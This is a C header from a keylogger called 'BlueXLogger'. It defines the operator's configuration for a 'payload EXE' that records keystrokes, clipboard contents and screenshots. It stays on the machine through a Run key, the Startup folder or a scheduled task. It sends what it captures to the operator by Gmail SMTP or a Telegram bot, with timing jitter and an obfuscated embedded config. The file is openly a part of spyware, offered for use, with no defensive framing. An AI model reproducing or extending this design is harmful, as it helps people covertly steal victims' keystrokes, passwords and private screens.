/*============================================================================
 * BlueXLogger - bxl_config.h
 * Operator configuration model, serialization and embedded-resource patching.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Configuration model
 * -------------------
 * A fixed-size, zero-initialised POD struct is the single source of truth.
 * It is serialized into a fixed 24-byte header + obfuscated body, and that
 * blob is what lives inside the payload EXE.
 *
 * Two delivery modes are supported (see bxl_patch.h):
 *   1. EMBEDDED  - blob patched into the payload's BXL_CFG RCDATA slot.
 *   2. SIDECAR   - blob written to BlueXLogger.cfg next to the EXE.
 * The payload prefers an embedded blob that is marked "configured", and falls
 * back to the sidecar otherwise.
 *==========================================================================*/
#ifndef BXL_CONFIG_H
#define BXL_CONFIG_H

#include "bxl_common.h"

/* ---- field capacities ----------------------------------------------------*/
#define BXL_MAX_EMAIL     256
#define BXL_MAX_PASS      160
#define BXL_MAX_HOST      192
#define BXL_MAX_PATH      512
#define BXL_MAX_SUBJECT   192
#define BXL_MAX_HOSTNAME  128

/* ---- SMTP ----------------------------------------------------------------*/
#define BXL_TLS_IMPLICIT  0   /* smtp.gmail.com:465, TLS from byte 0        */
#define BXL_TLS_STARTTLS  1   /* smtp.gmail.com:587, upgrade via STARTTLS   */
#define BXL_TLS_NONE      2   /* plaintext - testing / local sinks only     */

/* ---- delivery channel ----------------------------------------------------*/
#define BXL_CHANNEL_EMAIL     0   /* SMTP only                              */
#define BXL_CHANNEL_TELEGRAM  1   /* Telegram Bot API only                  */
#define BXL_CHANNEL_BOTH      2   /* both, independently                    */

#define BXL_MAX_TOKEN     128
#define BXL_MAX_CHATID     64

/* ---- screenshot format ---------------------------------------------------*/
#define BXL_FMT_PNG       0
#define BXL_FMT_JPEG      1

/* ---- monitor selection ---------------------------------------------------*/
#define BXL_MON_ALL       0
#define BXL_MON_PRIMARY   1

/* ---- persistence methods -------------------------------------------------*/
#define BXL_PERSIST_OFF          0
#define BXL_PERSIST_RUNKEY       1
#define BXL_PERSIST_STARTUP      2
#define BXL_PERSIST_SCHEDTASK    3

/* ---- config blob layout --------------------------------------------------*/
#define BXL_CFG_MAGIC_OK      "BXCFG1"   /* 6 bytes + 2 NUL = 8 */
#define BXL_CFG_MAGIC_EMPTY   "BXCFG0"   /* placeholder shipped in template  */
#define BXL_CFG_MAGIC_LEN     8
#define BXL_CFG_HEADER_LEN    24
#define BXL_CFG_SLOT_SIZE     8192       /* RCDATA slot size in the payload  */

/* ---- limits --------------------------------------------------------------*/
#define BXL_MAX_INTERVAL_MIN      10080u  /* one week */
#define BXL_MAX_ATTACH_BYTES_MIN  262144u
#define BXL_MAX_ATTACH_BYTES_MAX  26214400u /* Gmail's 25 MB ceiling */

typedef struct BxlConfig {
    /* -- identity / layout ------------------------------------------------*/
    bxl_u32 struct_size;
    bxl_u32 version;

    /* -- delivery ---------------------------------------------------------*/
    char    recipient[BXL_MAX_EMAIL];
    char    sender[BXL_MAX_EMAIL];
    char    app_password[BXL_MAX_PASS];
    char    smtp_host[BXL_MAX_HOST];
    bxl_u16 smtp_port;
    bxl_u8  tls_mode;             /* BXL_TLS_*                            */
    bxl_u8  auth_enabled;
    char    subject_prefix[BXL_MAX_SUBJECT];
    bxl_u8  html_body;            /* include an HTML alternative part     */
    bxl_u8  separate_emails;      /* logs and shots in separate messages  */
    bxl_u16 _pad0;

    /* -- Telegram Bot API -------------------------------------------------*/
    /* Kept in the same struct as the SMTP settings rather than a separate
     * sidecar so that one embedded blob still describes the whole delivery
     * configuration, and the payload has exactly one thing to read. */
    bxl_u8  channel;              /* BXL_CHANNEL_*                        */
    bxl_u8  tg_parse_html;        /* send digests with parse_mode=HTML    */
    bxl_u8  tg_send_screenshots;  /* attach screenshots to the chat       */
    bxl_u8  tg_full_log_file;     /* also send the full log as .txt       */
    char    tg_bot_token[BXL_MAX_TOKEN];
    char    tg_chat_id[BXL_MAX_CHATID];

    /* -- log schedule -----------------------------------------------------*/
    bxl_u32 log_interval_min;     /* 0 = interval trigger disabled        */
    bxl_u32 log_keystroke_threshold; /* 0 = threshold trigger disabled    */

    /* -- screenshot schedule / format -------------------------------------*/
    bxl_u8  shot_enabled;
    bxl_u8  shot_monitors;        /* BXL_MON_*                            */
    bxl_u8  shot_format;          /* BXL_FMT_*                            */
    bxl_u8  shot_jpeg_quality;    /* 1..100                               */
    bxl_u32 shot_interval_min;    /* 0 = disabled                         */
    bxl_u32 shot_max_dim;         /* 0 = no downscale                     */
    bxl_u32 shot_max_count;       /* cap screenshots per batch            */

    /* -- daily consolidated report ----------------------------------------*/
    bxl_u8  daily_enabled;
    bxl_u8  daily_hour;           /* 0..23                                */
    bxl_u8  daily_minute;         /* 0..59                                */
    bxl_u8  _pad1;

    /* -- jitter -----------------------------------------------------------*/
    bxl_u8  jitter_enabled;
    bxl_u8  jitter_percent;       /* 0..50                                */
    bxl_u16 _pad2;

    /* -- runtime behaviour ------------------------------------------------*/
    bxl_u8  persistence;          /* BXL_PERSIST_*                        */
    bxl_u8  single_instance;
    bxl_u8  hotkey_enabled;
    bxl_u8  hotkey_mods;          /* MOD_CONTROL | MOD_ALT | MOD_SHIFT ...*/
    bxl_u8  hotkey_vk;
    /* Graceful stop. Without this the only way to end the process is Task
     * Manager, which terminates it without running the shutdown path - no
     * final flush and no last delivery attempt. Off by default, like the
     * pause hotkey. */
    bxl_u8  quit_hotkey_enabled;
    bxl_u8  quit_hotkey_mods;     /* MOD_CONTROL | MOD_ALT ...            */
    bxl_u8  quit_hotkey_vk;
    bxl_u8  clipboard_capture;
    bxl_u8  capture_raw_input;    /* enable WM_INPUT fallback path        */
    bxl_u8  debug_log;
    bxl_u32 retention_days;       /* purge temp artefacts older than N    */
    bxl_u32 max_attach_bytes;     /* per-message attachment budget        */
    char    storage_dir[BXL_MAX_PATH];

    /* -- integrity --------------------------------------------------------*/
    bxl_u32 crc;                  /* CRC32 over [0, offsetof(crc))        */
} BxlConfig;

/* ---------------------------------------------------------------------------
 * API
 * -------------------------------------------------------------------------*/

/* Zero the struct and fill every field with its documented default. */
void bxl_config_defaults(BxlConfig *cfg);

/* Clamp every field into range. Safe to call on untrusted input. */
void bxl_config_sanitize(BxlConfig *cfg);

/* CRC32 (IEEE 802.3, reflected, poly 0xEDB88320) over an arbitrary buffer. */
bxl_u32 bxl_crc32(const void *data, size_t len);

/* Recompute cfg->crc. Call after mutating any field. */
void bxl_config_seal(BxlConfig *cfg);

/* Returns BXL_TRUE when the CRC matches. */
int bxl_config_verify(const BxlConfig *cfg);

/*
 * Serialize cfg into blob (header + obfuscated body).
 * blob_cap must be >= BXL_CFG_HEADER_LEN + sizeof(BxlConfig).
 * Returns total bytes written, or 0 on failure.
 */
size_t bxl_config_serialize(const BxlConfig *cfg, void *blob, size_t blob_cap);

/*
 * Parse a blob produced by bxl_config_serialize().
 * Returns BXL_TRUE on success. cfg is fully overwritten on success and left
 * untouched on failure.
 */
int bxl_config_deserialize(const void *blob, size_t blob_len, BxlConfig *cfg);

/* Maximum serialized size for a given build. */
size_t bxl_config_blob_max(void);

/*
 * Reads an embedded blob out of a running module's BXL_CFG resource.
 * Returns BXL_TRUE when a blob was found AND is marked configured.
 * *was_placeholder is set to BXL_TRUE if a slot existed but was unconfigured.
 */
int bxl_config_load_embedded(void *blob, size_t blob_cap, size_t *blob_len,
                             int *was_placeholder);

/*
 * Locate the configuration for this process.
 *   1. embedded, configured  -> use it
 *   2. sidecar next to EXE   -> use it
 * Returns BXL_TRUE on success.
 */
int bxl_config_load_effective(BxlConfig *cfg, const wchar_t *exe_path);

/* Sidecar path helper: <exe_dir>\BlueXLogger.cfg */
int bxl_config_sidecar_path(const wchar_t *exe_path, wchar_t *out, size_t out_cch);

/* Write/read the sidecar form. */
int bxl_config_write_sidecar(const wchar_t *path, const BxlConfig *cfg);
int bxl_config_read_sidecar(const wchar_t *path, BxlConfig *cfg);

/* Human readable validation. Returns BXL_TRUE when usable for delivery.
 * If err is non-NULL it receives a NUL-terminated reason on failure. */
int bxl_config_validate(const BxlConfig *cfg, char *err, size_t err_cch);

/* The placeholder blob that gets compiled into the payload template. */
size_t bxl_config_make_placeholder(void *blob, size_t blob_cap);

/* Returns BXL_TRUE when blob carries the placeholder magic. */
int bxl_config_is_placeholder(const void *blob, size_t blob_len);

#endif /* BXL_CONFIG_H */
